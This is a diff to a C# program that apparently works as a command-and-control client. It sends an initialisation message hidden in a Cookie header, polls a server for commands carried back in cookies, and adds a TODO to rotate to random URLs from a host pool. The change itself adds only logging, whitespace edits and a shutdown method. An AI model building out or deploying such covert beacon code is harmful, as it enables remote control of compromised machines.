@@ -34,6 +34,7 @@ namespace hevsn
             Boolean gotSth = false;
             HttpResponseMessage? resp = null;
             Console.Write("URL: " + URL + "\n");
+            //Todo: if counter > sth, then replace URL with random URL from URL Pool
             while(!gotSth)
             {
                 try
@@ -65,7 +66,6 @@ namespace hevsn
                             gotSth = true;
                         }
                     }
-                    
                 }
             }
             if(gotSth)
@@ -82,10 +82,8 @@ namespace hevsn
                     Console.Write("Waiting for commands...\n");
                     gotSth = false;
                     command = "";
-                }
-                
-            }
-            
+                }   
+            }     
         }
             
 
@@ -119,8 +117,12 @@ namespace hevsn
             {
                 string initializer = makeOutp("est");
                 HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, URL);
+
                 request.Headers.Add("Cookie", initializer);
+                Console.Write("Sending init...\n");
                 HttpResponseMessage responserino = await httpClient.SendAsync(request);
+                Console.Write("Init sent!\n");
+
                 foreach (KeyValuePair<string, IEnumerable<string>> myHeader in responserino.Headers)
                 {
                     if(myHeader.Key.Equals("Cookie"))
@@ -161,5 +163,14 @@ namespace hevsn
 
             return output;
         }
+        public Boolean shutdown()
+        {
+            httpClient.CancelPendingRequests();
+            httpClient.Dispose();
+            httpClient.CancelPendingRequests();
+            return true;
+        }
     }
+
+    
 }
